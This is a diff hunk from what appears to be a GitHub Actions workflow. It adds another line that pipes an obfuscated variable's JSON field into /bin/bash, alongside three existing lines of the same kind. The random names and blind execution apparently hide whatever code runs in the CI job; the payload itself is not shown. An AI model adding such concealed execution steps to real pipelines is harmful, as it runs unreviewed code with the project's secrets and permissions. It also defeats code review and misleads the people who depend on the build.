@@ -20,6 +20,7 @@ jobs:
           echo $kckds72981 | jq -r .qwsxm477 | /bin/bash
           echo $dmpo104 | jq -r .a07 | /bin/bash
           printf '%s' "$tl3" | jq -r .hija8 | /bin/bash
+          echo $bdm880 | jq -r .ghxok85581 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
